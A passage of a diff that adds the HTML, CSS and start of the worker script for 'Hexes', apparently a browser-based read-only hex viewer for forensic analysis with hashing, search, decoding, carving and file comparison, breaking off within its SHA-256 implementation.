@@ -1,0 +1,2258 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hexes</title>
+<meta name="description" content="A read-only hex viewer for DFIR that runs in your browser: hashing, signatures, a value inspector, search, entropy, carving, XOR/Base64 decoding and two-file compare.">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%2314121a'/%3E%3Cpath d='M9 8v16M9 16h7M16 8v16M20 11l6 10M26 11l-6 10' stroke='%23e3a659' stroke-width='2.6' stroke-linecap='round' fill='none'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=UnifrakturCook:wght@700&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: one-screen workbench — header, evidence strip, toolbar, then hex grid + entropy track on the left, inspector/tools on the right. */
+:root {
+  --bg: #f2f0f5;
+  --surface: #ffffff;
+  --sunk: #e9e6ef;
+  --line: #d8d3e0;
+  --fg: #1f1b28;
+  --dim: #6d6680;
+  --faint: #b3adbf;
+  --accent: #9a5a12;        /* candle amber */
+  --accent-ink: #ffffff;
+  --sel: #d9ccf3;           /* nightshade selection */
+  --cursor: #5b3fa6;
+  --edited: #c2334e;
+  --match: #f2d38a;
+  --good: #2f7a4f;
+  --warn: #b0721a;
+  --ent-lo: #e3dfea;
+  --ent-mid: #9b8cc4;
+  --ent-hi: #d0612a;
+  --diff: #f6c9cf;           /* bytes that differ between A and B */
+  --diff-ink: #8f1d33;
+  --extra: #cfe3d6;          /* bytes past the end of the other file */
+  --font-display: "UnifrakturCook", "Old English Text MT", Georgia, serif;
+  --font-ui: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+  --font-mono: "IBM Plex Mono", ui-monospace, "Cascadia Code", Menlo, Consolas, monospace;
+  --row: 22px;
+  --radius: 6px;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #14121a; --surface: #1c1924; --sunk: #110f16; --line: #2d2838;
+    --fg: #e7e2ef; --dim: #958da6; --faint: #4f4860;
+    --accent: #e3a659; --accent-ink: #1a1308;
+    --sel: #3c2e63; --cursor: #b79cff; --edited: #ff6f87; --match: #6b5520;
+    --good: #6fcf97; --warn: #e3a659;
+    --ent-lo: #231f2d; --ent-mid: #6b5aa6; --ent-hi: #ff8a4c;
+    --diff: #5a1f2b; --diff-ink: #ffb3c0; --extra: #1f3b2c;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #14121a; --surface: #1c1924; --sunk: #110f16; --line: #2d2838;
+  --fg: #e7e2ef; --dim: #958da6; --faint: #4f4860;
+  --accent: #e3a659; --accent-ink: #1a1308;
+  --sel: #3c2e63; --cursor: #b79cff; --edited: #ff6f87; --match: #6b5520;
+  --good: #6fcf97; --warn: #e3a659;
+  --ent-lo: #231f2d; --ent-mid: #6b5aa6; --ent-hi: #ff8a4c;
+    --diff: #5a1f2b; --diff-ink: #ffb3c0; --extra: #1f3b2c;
+  color-scheme: dark;
+}
+
+* { box-sizing: border-box; }
+[hidden] { display: none !important; }
+html, body { height: 100%; margin: 0; }
+body { background: var(--bg); color: var(--fg); font: 14px/1.45 var(--font-ui); overflow: hidden; }
+button, input, select { font: inherit; color: inherit; }
+code, kbd { font-family: var(--font-mono); }
+.sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); }
+:focus-visible { outline: 2px solid var(--cursor); outline-offset: 1px; }
+
+#app { height: 100%; display: grid; grid-template-rows: auto auto auto 1fr auto; }
+
+/* ---------- header ---------- */
+.top { display: flex; align-items: center; gap: 20px; padding: 10px 18px; border-bottom: 1px solid var(--line); background: var(--surface); flex-wrap: wrap; }
+.brand { display: flex; align-items: baseline; gap: 10px; }
+.wordmark { font-family: var(--font-display); font-size: 30px; line-height: 1; color: var(--accent); letter-spacing: .5px; }
+.tagline { font-size: 11px; text-transform: uppercase; letter-spacing: .12em; color: var(--dim); }
+.open { display: flex; gap: 8px; flex: 1; min-width: 260px; align-items: center; flex-wrap: wrap; }
+.open-hint { font-size: 12.5px; color: var(--dim); }
+label.btn { display: inline-flex; align-items: center; }
+.home { color: var(--dim); font-size: 13px; text-decoration: none; white-space: nowrap; }
+.home:hover { color: var(--accent); }
+.w-sub { font-size: 12.5px; }
+body.dragging .grid-wrap::after { content: 'Drop to open'; position: absolute; inset: 10px; border: 2px dashed var(--accent); border-radius: 10px; display: grid; place-items: center; font-size: 18px; color: var(--accent); background: color-mix(in srgb, var(--bg) 80%, transparent); z-index: 5; pointer-events: none; }
+.out-card button { justify-self: start; }
+input[type=text], select { background: var(--sunk); border: 1px solid var(--line); border-radius: var(--radius); padding: 6px 9px; }
+input[type=text] { font-family: var(--font-mono); font-size: 13px; }
+input::placeholder { color: var(--faint); }
+
+.btn { background: var(--accent); color: var(--accent-ink); border: 1px solid transparent; border-radius: var(--radius); padding: 6px 13px; font-weight: 500; cursor: pointer; white-space: nowrap; }
+.btn:hover { filter: brightness(1.08); }
+.btn.ghost { background: transparent; color: var(--fg); border-color: var(--line); }
+.btn.ghost:hover { background: var(--sunk); filter: none; }
+.btn.small { padding: 4px 10px; font-size: 13px; }
+.btn.danger { background: var(--edited); color: #fff; }
+.btn:disabled { opacity: .45; cursor: default; filter: none; }
+
+.lock { display: inline-flex; align-items: center; gap: 8px; padding: 6px 12px; border-radius: 999px; border: 1px solid var(--line); background: var(--sunk); cursor: pointer; font-weight: 500; font-size: 13px; }
+.lock-dot { width: 9px; height: 9px; border-radius: 50%; background: var(--good); box-shadow: 0 0 0 3px color-mix(in srgb, var(--good) 22%, transparent); }
+body.editing .lock { border-color: var(--edited); color: var(--edited); }
+body.editing .lock-dot { background: var(--edited); box-shadow: 0 0 0 3px color-mix(in srgb, var(--edited) 25%, transparent); }
+
+/* ---------- evidence strip ---------- */
+.evidence { display: flex; align-items: center; gap: 24px; padding: 8px 18px; border-bottom: 1px solid var(--line); flex-wrap: wrap; }
+.ev-main { display: flex; flex-direction: column; min-width: 0; }
+.ev-name { font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 40ch; }
+.ev-type { font-size: 12px; color: var(--accent); }
+.ev-mtime { font-size: 11.5px; color: var(--dim); font-variant-numeric: tabular-nums; }
+.ev-meta { display: flex; gap: 22px; margin: 0; flex: 1; flex-wrap: wrap; min-width: 0; }
+.ev-meta div { min-width: 0; }
+.ev-meta dt { font-size: 10.5px; text-transform: uppercase; letter-spacing: .1em; color: var(--dim); }
+.ev-meta dd { margin: 0; font-variant-numeric: tabular-nums; }
+.ev-meta code { font-size: 12px; word-break: break-all; }
+
+/* ---------- toolbar ---------- */
+.toolbar { display: flex; align-items: center; gap: 16px; padding: 7px 18px; border-bottom: 1px solid var(--line); flex-wrap: wrap; }
+.goto { display: flex; align-items: center; gap: 8px; }
+.goto label { font-size: 12px; color: var(--dim); text-transform: uppercase; letter-spacing: .08em; }
+.goto input { width: 190px; }
+.seg { display: inline-flex; border: 1px solid var(--line); border-radius: var(--radius); overflow: hidden; }
+.seg button { background: transparent; border: 0; padding: 5px 11px; cursor: pointer; font-size: 13px; color: var(--dim); }
+.seg button.on { background: var(--fg); color: var(--bg); }
+.hint { font-size: 12px; color: var(--dim); }
+kbd { font-size: 11px; border: 1px solid var(--line); border-bottom-width: 2px; border-radius: 4px; padding: 0 4px; background: var(--surface); }
+.edit-actions { display: inline-flex; gap: 8px; align-items: center; margin-left: auto; color: var(--edited); font-weight: 500; font-size: 13px; }
+
+/* ---------- work area ---------- */
+.work { display: grid; grid-template-columns: minmax(0, 1fr) 360px; min-height: 0; }
+.viewer { display: flex; flex-direction: column; min-width: 0; min-height: 0; border-right: 1px solid var(--line); }
+.view-head, .row { font-family: var(--font-mono); font-size: 13px; white-space: pre; }
+.view-head { padding: 6px 0 4px; color: var(--dim); border-bottom: 1px solid var(--line); overflow: hidden; background: var(--surface); }
+.grid-wrap { position: relative; flex: 1; min-height: 0; display: flex; }
+.pane { flex: 1; display: flex; flex-direction: column; min-width: 0; min-height: 0; }
+.pane-b { border-left: 2px solid var(--line); }
+.grid { flex: 1; overflow: hidden; outline: none; user-select: none; cursor: text; padding-top: 2px; }
+body.comparing .track { width: 34px; }
+body.comparing .row, body.comparing .view-head { font-size: 12px; }
+body.comparing .off { padding: 0 10px; }
+body.comparing .hx { padding-right: 10px; }
+body.comparing .as { padding-left: 8px; }
+.df { background: var(--diff); color: var(--diff-ink); }
+.xs { background: var(--extra); }
+.slot { display: inline-grid; place-items: center; width: 22px; height: 22px; border-radius: 5px; font-weight: 600; font-size: 12px; background: var(--fg); color: var(--bg); flex: none; }
+.slot-b { background: var(--cursor); }
+.ev-b { background: color-mix(in srgb, var(--cursor) 6%, transparent); }
+.view-head .who { color: var(--fg); font-weight: 500; }
+.row { height: var(--row); line-height: var(--row); display: flex; }
+.off { color: var(--dim); padding: 0 14px 0 14px; border-left: 3px solid transparent; }
+.off.hot { border-left-color: var(--ent-hi); }
+.hx { display: flex; padding-right: 14px; }
+.hx span { width: 2.6ch; text-align: center; }
+.hx span:nth-child(8) { margin-right: 1ch; }
+.as { display: flex; padding-left: 12px; border-left: 1px solid var(--line); }
+.as span { width: 1.1ch; text-align: center; }
+.z { color: var(--faint); }
+.p { color: var(--fg); }
+.n { color: var(--dim); }
+.ld { color: var(--faint); }
+.mt { background: var(--match); }
+.sl { background: var(--sel); }
+.ed { color: var(--edited); font-weight: 600; }
+.cu { outline: 1.5px solid var(--cursor); outline-offset: -1.5px; border-radius: 2px; }
+.grid.pane-hex .hx .cu, .grid.pane-ascii .as .cu { background: var(--cursor); color: var(--bg); }
+.nib { text-decoration: underline; }
+
+.track { width: 26px; height: 100%; flex: none; border-left: 1px solid var(--line); cursor: pointer; background: var(--sunk); }
+.welcome { position: absolute; inset: 0 26px 0 0; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 24px; color: var(--dim); max-width: none; }
+.welcome p { max-width: 46ch; margin: 4px 0; }
+.w-title { font-size: 18px; color: var(--fg); font-weight: 500; }
+
+/* ---------- side panels ---------- */
+.side { display: flex; flex-direction: column; min-height: 0; overflow: auto; background: var(--surface); }
+.panel { padding: 12px 16px; border-bottom: 1px solid var(--line); }
+.panel-head { display: flex; align-items: baseline; justify-content: space-between; margin-bottom: 6px; }
+.panel h2 { font-size: 11px; text-transform: uppercase; letter-spacing: .12em; margin: 0; color: var(--dim); font-weight: 600; }
+.panel-sub { font-family: var(--font-mono); font-size: 12px; color: var(--accent); }
+.insp { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+.insp th { text-align: left; font-weight: 500; color: var(--dim); padding: 2px 10px 2px 0; white-space: nowrap; vertical-align: top; width: 1%; }
+.insp td { font-family: var(--font-mono); font-size: 12px; padding: 2px 0; word-break: break-all; font-variant-numeric: tabular-nums; }
+.insp tr.grp th { padding-top: 8px; font-size: 10.5px; text-transform: uppercase; letter-spacing: .1em; color: var(--faint); }
+.insp td.na { color: var(--faint); }
+.insp td.sig { color: var(--accent); font-family: var(--font-ui); }
+
+.tools { flex: 1; display: flex; flex-direction: column; min-height: 260px; }
+.tabs { display: flex; gap: 4px; margin-bottom: 10px; border-bottom: 1px solid var(--line); }
+.tab { background: none; border: 0; padding: 6px 10px; margin-bottom: -1px; border-bottom: 2px solid transparent; cursor: pointer; color: var(--dim); font-weight: 500; }
+.tab.on { color: var(--fg); border-bottom-color: var(--accent); }
+.tabpane { display: flex; flex-direction: column; gap: 8px; min-height: 0; }
+.stack { display: flex; flex-direction: column; gap: 8px; }
+.row2 { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+.row2 select { flex: 1; }
+.row2 input[type=text] { flex: 1; min-width: 0; }
+.grow { flex: 1; }
+.check { display: inline-flex; gap: 5px; align-items: center; font-size: 13px; color: var(--dim); }
+.note { font-size: 12.5px; color: var(--dim); margin: 0; }
+.progress { height: 3px; background: var(--sunk); border-radius: 2px; overflow: hidden; }
+.progress span { display: block; height: 100%; width: 0; background: var(--accent); transition: width .2s; }
+.result-head { font-size: 12.5px; color: var(--dim); }
+.results { position: relative; list-style: none; margin: 0; padding: 0; overflow: auto; max-height: 34vh; font-family: var(--font-mono); font-size: 12px; border: 1px solid var(--line); border-radius: var(--radius); }
+.results:empty { display: none; }
+.results li { display: flex; gap: 10px; padding: 3px 8px; cursor: pointer; border-bottom: 1px solid var(--line); }
+.results li:last-child { border-bottom: 0; }
+.results li:hover, .results li.on { background: var(--sel); }
+.results .ro { color: var(--accent); }
+.results .rp { color: var(--dim); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.dec-out, .sel-out { display: flex; flex-direction: column; gap: 8px; }
+.dec-block { border: 1px solid var(--line); border-radius: var(--radius); overflow: hidden; }
+.dec-block header { display: flex; align-items: center; gap: 8px; padding: 5px 8px; background: var(--sunk); font-size: 12px; color: var(--dim); }
+.dec-block header b { color: var(--fg); font-weight: 600; }
+.dec-block pre { margin: 0; padding: 8px; font-family: var(--font-mono); font-size: 12px; white-space: pre-wrap; word-break: break-all; max-height: 26vh; overflow: auto; }
+.kv { display: grid; grid-template-columns: auto 1fr; gap: 3px 12px; margin: 0; font-size: 13px; }
+.kv dt { color: var(--dim); }
+.kv dd { margin: 0; font-family: var(--font-mono); font-size: 12.5px; word-break: break-all; }
+.btn-row { display: flex; gap: 6px; flex-wrap: wrap; }
+.btn-row.end { justify-content: flex-end; }
+.out-card { border: 1px solid var(--line); border-radius: var(--radius); padding: 8px 10px; font-size: 12.5px; display: grid; gap: 3px; }
+.out-card b { font-weight: 600; }
+.out-card code { font-size: 11.5px; word-break: break-all; color: var(--dim); }
+.out-card a { color: var(--accent); }
+
+/* ---------- status ---------- */
+.status { display: flex; gap: 22px; padding: 5px 18px; border-top: 1px solid var(--line); font-family: var(--font-mono); font-size: 12px; color: var(--dim); background: var(--surface); font-variant-numeric: tabular-nums; flex-wrap: wrap; }
+#stMsg { color: var(--accent); }
+
+/* ---------- modal & toast ---------- */
+.modal { position: fixed; inset: 0; background: color-mix(in srgb, var(--bg) 70%, transparent); display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 20; }
+.modal-card { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 20px 22px; max-width: 440px; box-shadow: 0 20px 50px rgba(0,0,0,.25); }
+.modal-card h3 { margin: 0 0 8px; font-size: 17px; }
+.modal-card p { margin: 0 0 16px; color: var(--dim); }
+.toast { position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%); background: var(--fg); color: var(--bg); padding: 8px 14px; border-radius: var(--radius); font-size: 13px; z-index: 30; max-width: 90vw; }
+
+@media (max-width: 900px) {
+  body { overflow: auto; }
+  #app { height: auto; min-height: 100%; }
+  .work { grid-template-columns: 1fr; }
+  .viewer { height: 60vh; border-right: 0; }
+  .hint { display: none; }
+}
+@media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+.pane-b .hx { padding-left: 10px; }
+
+</style>
+</head>
+<body>
+<div id="app">
+
+  <header class="top">
+    <div class="brand">
+      <span class="wordmark">Hexes</span>
+      <span class="tagline">put a hex on it</span>
+    </div>
+    <a class="home" href="/tools/">jon.glass / Tools</a>
+    <div class="open">
+      <input id="fileA" type="file" class="sr" tabindex="-1">
+      <label for="fileA" class="btn" id="openBtn" tabindex="0" role="button">Open file…</label>
+      <button type="button" id="sampleBtn" class="btn ghost">Sample</button>
+      <span class="open-hint" id="openHint">or drop a file anywhere · stays on your machine</span>
+    </div>
+    <button type="button" id="logBtn" class="btn ghost small" title="Download a JSON Lines log of every open, carve, export and compare in this session">Session log</button>
+    <button id="lockBtn" class="lock" type="button" aria-live="polite" title="Toggle edit mode">
+      <span class="lock-dot"></span><span id="lockText">Sealed · read-only</span>
+    </button>
+  </header>
+
+  <section class="evidence" id="evidence" hidden>
+    <span class="slot slot-a" hidden>A</span>
+    <div class="ev-main">
+      <span class="ev-name" id="evName"></span>
+      <span class="ev-type" id="evType"></span>
+      <span class="ev-mtime" id="evMtime"></span>
+    </div>
+    <dl class="ev-meta">
+      <div><dt>Size</dt><dd id="evSize"></dd></div>
+      <div><dt>MD5</dt><dd><code id="evMd5">hashing…</code></dd></div>
+      <div><dt>SHA-256</dt><dd><code id="evSha">hashing…</code></dd></div>
+    </dl>
+    <button class="btn ghost small" id="copyHashes" type="button">Copy hashes</button>
+  </section>
+
+  <section class="evidence ev-b" id="evidenceB" hidden>
+    <span class="slot slot-b">B</span>
+    <div class="ev-main">
+      <span class="ev-name" id="evNameB"></span>
+      <span class="ev-type" id="evTypeB"></span>
+    </div>
+    <dl class="ev-meta">
+      <div><dt>Size</dt><dd id="evSizeB"></dd></div>
+      <div><dt>MD5</dt><dd><code id="evMd5B">hashing…</code></dd></div>
+      <div><dt>SHA-256</dt><dd><code id="evShaB">hashing…</code></dd></div>
+    </dl>
+    <button class="btn ghost small" id="closeB" type="button">Close B</button>
+  </section>
+
+  <div class="toolbar">
+    <form id="gotoForm" class="goto">
+      <label for="gotoInput">Go to</label>
+      <input id="gotoInput" type="text" placeholder="0x7FFF0, +0x200, -64" autocomplete="off" spellcheck="false">
+    </form>
+    <div class="seg" role="group" aria-label="Byte order">
+      <button type="button" id="leBtn" class="on" aria-pressed="true">Little-endian</button>
+      <button type="button" id="beBtn" aria-pressed="false">Big-endian</button>
+    </div>
+    <span class="hint"><kbd>Ctrl</kbd>+<kbd>E</kbd> endian · <kbd>Ctrl</kbd>+<kbd>G</kbd> go to · <kbd>Ctrl</kbd>+<kbd>F</kbd> search · <kbd>F7</kbd> next difference</span>
+    <span class="edit-actions" id="editActions" hidden>
+      <span id="editCount">0 changes</span>
+      <button type="button" class="btn small" id="exportBtn">Export patched copy</button>
+      <button type="button" class="btn ghost small" id="revertBtn">Revert all</button>
+    </span>
+  </div>
+
+  <main class="work">
+    <section class="viewer" aria-label="Hex view">
+      <div class="grid-wrap">
+        <div class="pane" id="paneA">
+          <div class="view-head" id="viewHead"></div>
+          <div id="grid" class="grid" tabindex="0"></div>
+        </div>
+        <div class="pane pane-b" id="paneB" hidden>
+          <div class="view-head" id="viewHeadB"></div>
+          <div id="gridB" class="grid" tabindex="0"></div>
+        </div>
+        <div id="welcome" class="welcome">
+          <p class="w-title">Open an evidence file to begin.</p>
+          <p>Choose a file, drop one here, or open the sample to try things out. Nothing is uploaded: Hexes reads the file in your browser, read-only, and hashes it as soon as it loads.</p>
+          <p class="w-sub">Disk images work too. Hexes only reads the parts you look at, so a multi-gigabyte file opens instantly.</p>
+        </div>
+        <canvas id="track" class="track" aria-label="Entropy and difference map. Click to jump."></canvas>
+      </div>
+    </section>
+
+    <aside class="side">
+      <section class="panel">
+        <header class="panel-head">
+          <h2>Inspector</h2>
+          <span class="panel-sub" id="inspAt">—</span>
+        </header>
+        <table class="insp" id="insp"></table>
+      </section>
+
+      <section class="panel tools">
+        <div class="tabs" role="tablist">
+          <button role="tab" class="tab on" data-tab="search" aria-selected="true">Search</button>
+          <button role="tab" class="tab" data-tab="decode" aria-selected="false">Decode</button>
+          <button role="tab" class="tab" data-tab="sel" aria-selected="false">Selection</button>
+          <button role="tab" class="tab" data-tab="cmp" aria-selected="false">Compare</button>
+        </div>
+
+        <div class="tabpane" data-pane="search">
+          <form id="searchForm" class="stack">
+            <div class="row2">
+              <label for="searchType" class="sr">Search type</label>
+              <select id="searchType">
+                <option value="hex">Hex bytes</option>
+                <option value="ascii">Text (ASCII)</option>
+                <option value="utf16">Text (UTF-16LE)</option>
+                <option value="regex">Regex</option>
+              </select>
+              <label class="check"><input type="checkbox" id="searchCi"> Ignore case</label>
+            </div>
+            <label for="searchQ" class="sr">Search for</label>
+            <input id="searchQ" type="text" placeholder="4D 5A ?? 00" autocomplete="off" spellcheck="false">
+            <div class="row2">
+              <label class="check"><input type="checkbox" id="searchFromCursor"> From cursor</label>
+              <span class="grow"></span>
+              <button type="button" class="btn ghost small" id="searchCancel" hidden>Stop</button>
+              <button type="submit" class="btn small">Search</button>
+            </div>
+          </form>
+          <div class="progress" id="searchProg" hidden><span></span></div>
+          <div class="result-head" id="searchHead"></div>
+          <ol class="results" id="searchResults"></ol>
+        </div>
+
+        <div class="tabpane" data-pane="decode" hidden>
+          <p class="note">Decodes the current selection. Select bytes in the grid first.</p>
+          <div class="row2">
+            <label for="decMode" class="sr">Decoder</label>
+            <select id="decMode">
+              <option value="b64">Base64</option>
+              <option value="xor">XOR with key</option>
+              <option value="brute">XOR brute force (1 byte)</option>
+              <option value="hexstr">Hex text → bytes</option>
+            </select>
+            <label for="decKey" class="sr">XOR key</label>
+            <input id="decKey" type="text" placeholder="key: 5A or DE AD" autocomplete="off" spellcheck="false">
+          </div>
+          <div class="row2">
+            <span id="decSrc" class="note grow">No selection</span>
+            <button type="button" class="btn small" id="decRun">Decode</button>
+          </div>
+          <div id="decOut" class="dec-out"></div>
+        </div>
+
+        <div class="tabpane" data-pane="sel" hidden>
+          <dl class="kv" id="selInfo"></dl>
+          <div class="btn-row">
+            <button type="button" class="btn small" id="carveBtn">Carve to file</button>
+            <button type="button" class="btn ghost small" id="hashSelBtn">Hash selection</button>
+            <button type="button" class="btn ghost small" id="copyHexBtn">Copy as hex</button>
+            <button type="button" class="btn ghost small" id="copyTxtBtn">Copy as text</button>
+          </div>
+          <div id="selOut" class="sel-out"></div>
+        </div>
+
+        <div class="tabpane" data-pane="cmp" hidden>
+          <form id="cmpForm" class="stack">
+            <p class="note">Open a second file as B. Both scroll together and differing bytes are highlighted. B is always read-only.</p>
+            <input id="fileB" type="file" class="sr" tabindex="-1">
+            <div class="row2">
+              <button type="button" class="btn ghost small" id="sampleB">Tampered sample</button>
+              <span class="grow"></span>
+              <label for="fileB" class="btn small" tabindex="0" role="button">Choose file B…</label>
+            </div>
+            <p class="note">Tip: drop two files at once to open them as A and B, or drop one onto the B pane.</p>
+          </form>
+          <div class="progress" id="cmpProg" hidden><span></span></div>
+          <dl class="kv" id="cmpSummary"></dl>
+          <div class="row2" id="cmpNav" hidden>
+            <button type="button" class="btn ghost small" id="diffPrev">◀ Previous</button>
+            <button type="button" class="btn ghost small" id="diffNext">Next ▶</button>
+            <span class="grow"></span>
+            <button type="button" class="btn ghost small" id="cmpCsv">Save runs as CSV</button>
+          </div>
+          <ol class="results" id="cmpRuns"></ol>
+          <div id="cmpOut" class="sel-out"></div>
+        </div>
+      </section>
+    </aside>
+  </main>
+
+  <footer class="status" id="status">
+    <span id="stOffset">Offset —</span>
+    <span id="stSel"></span>
+    <span id="stEndian">LE</span>
+    <span id="stEntropy" class="grow"></span>
+    <span id="stMsg"></span>
+  </footer>
+</div>
+
+<div class="modal" id="modal" hidden>
+  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <h3 id="modalTitle">Unseal for editing?</h3>
+    <p>The original file stays untouched. Changes are kept in memory and only written when you export a patched copy to the exports folder.</p>
+    <div class="btn-row end">
+      <button type="button" class="btn ghost" id="modalNo">Keep sealed</button>
+      <button type="button" class="btn danger" id="modalYes">Unseal</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast" hidden></div>
+<script type="text/js-worker" id="worker-src">
+'use strict';
+// Hexes background worker: hashing, entropy, search, compare. Reads File/Blob slices only.
+
+// ---------------- incremental MD5 ----------------
+function MD5() {
+  this.h = new Int32Array([0x67452301, 0xefcdab89 | 0, 0x98badcfe | 0, 0x10325476]);
+  this.buf = new Uint8Array(64); this.len = 0; this.total = 0;
+  this.w = new Int32Array(16);
+}
+const MD5_K = new Int32Array(64), MD5_S = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21];
+for (let i = 0; i < 64; i++) MD5_K[i] = Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296) | 0;
+const MD5_G = new Uint8Array(64), MD5_R = new Uint8Array(64);
+for (let i = 0; i < 64; i++) {
+  MD5_G[i] = i < 16 ? i : i < 32 ? (5 * i + 1) & 15 : i < 48 ? (3 * i + 5) & 15 : (7 * i) & 15;
+  MD5_R[i] = MD5_S[(i >> 4) * 4 + (i & 3)];
+}
+MD5.prototype.block = function (b, o) {
+  const w = this.w, h = this.h, K = MD5_K, G = MD5_G, R = MD5_R;
+  for (let i = 0; i < 16; i++) { const p = o + i * 4; w[i] = b[p] | (b[p + 1] << 8) | (b[p + 2] << 16) | (b[p + 3] << 24); }
+  let a = h[0], bb = h[1], c = h[2], d = h[3], f, t, s, i = 0;
+  for (; i < 16; i++) { f = d ^ (bb & (c ^ d)); t = (a + f + K[i] + w[i]) | 0; s = R[i]; a = d; d = c; c = bb; bb = (bb + ((t << s) | (t >>> (32 - s)))) | 0; }
+  for (; i < 32; i++) { f = c ^ (d & (bb ^ c)); t = (a + f + K[i] + w[G[i]]) | 0; s = R[i]; a = d; d = c; c = bb; bb = (bb + ((t << s) | (t >>> (32 - s)))) | 0; }
+  for (; i < 48; i++) { f = bb ^ c ^ d; t = (a + f + K[i] + w[G[i]]) | 0; s = R[i]; a = d; d = c; c = bb; bb = (bb + ((t << s) | (t >>> (32 - s)))) | 0; }
+  for (; i < 64; i++) { f = c ^ (bb | ~d); t = (a + f + K[i] + w[G[i]]) | 0; s = R[i]; a = d; d = c; c = bb; bb = (bb + ((t << s) | (t >>> (32 - s)))) | 0; }
+  h[0] += a; h[1] += bb; h[2] += c; h[3] += d;
+};
+MD5.prototype.update = function (data) {
+  let i = 0; const n = data.length; this.total += n;
+  if (this.len) {
+    while (i < n && this.len < 64) this.buf[this.len++] = data[i++];
+    if (this.len === 64) { this.block(this.buf, 0); this.len = 0; }
+  }
+  for (; i + 64 <= n; i += 64) this.block(data, i);
+  while (i < n) this.buf[this.len++] = data[i++];
+};
+MD5.prototype.digest = function () {
+  const bits = this.total * 8, pad = new Uint8Array(((this.len < 56 ? 56 : 120) - this.len) + 8);
+  pad[0] = 0x80;
+  const lo = bits >>> 0, hi = Math.floor(bits / 4294967296) >>> 0, p = pad.length - 8;
+  for (let i = 0; i < 4; i++) { pad[p + i] = (lo >>> (8 * i)) & 255; pad[p + 4 + i] = (hi >>> (8 * i)) & 255; }
+  const total = this.total; this.update(pad); this.total = total;
+  let out = '';
+  for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) out += ((this.h[i] >>> (8 * j)) & 255).toString(16).padStart(2, '0');
+  return out;
+};
+
+// ---------------- incremental SHA-256 ----------------
+const SHA_K = new Int32Array([
+  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
+  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
+  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
+  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
+  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
+  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
+  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
+  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2]);
+function SHA256() {
+  this.h = new Int32Array([0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19]);
+  this.buf = new Uint8Array(64); this.len = 0; this.total = 0; this.w = new Int32Array(64);
+}
+SHA256.prototype.block = function (b, o) {
+  const w = this.w, K = SHA_K, h = this.h;
+  for (let i = 0; i < 16; i++) w[i] = (b[o + i * 4] << 24) | (b[o + i * 4 + 1] << 16) | (b[o + i * 4 + 2] << 8) | b[o + i * 4 + 3];
+  for (let i = 16; i < 64; i++) {
+    const x = w[i - 15], y = w[i - 2];
+    const s0 = ((x >>> 7) | (x << 25)) ^ ((x >>> 18) | (x << 14)) ^ (x >>> 3);
+    const s1 = ((y >>> 17) | (y << 15)) ^ ((y >>> 19) | (y << 13)) ^ (y >>> 10);
+    w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
+  }
+  let a = h[0], bb = h[1], c = h[2], d = h[3], e = h[4], f = h[5], g = h[6], hh = h[7];
+  for (let i = 0; i < 64; i++) {
+    const S1 = ((e >>> 6) | (e << 26)) ^ ((e >>> 11) | (e << 21)) ^ ((e >>> 25) | (e << 7));
+    const t1 = (hh + S1 + ((e & f) ^ (~e & g)) + K[i] + w[i]) | 0;
+    const S0 = ((a >>> 2) | (a << 30)) ^ ((a >>> 13) | (a << 19)) ^ ((a >>> 22) | (a << 10));
+    const t2 = (S0 + ((a & bb) ^ (a & c) ^ (bb & c))) | 0;
+    hh = g; g = f; f = e; e = (d + t1) | 0; d = c; c = bb; bb = a; a = (t1 + t2) | 0;
+  }
+  h[0] += a; h[1] += bb; h[2] += c; h[3] += d; h[4] += e; h[5] += f; h[6] += g; h[7] += hh;
+};
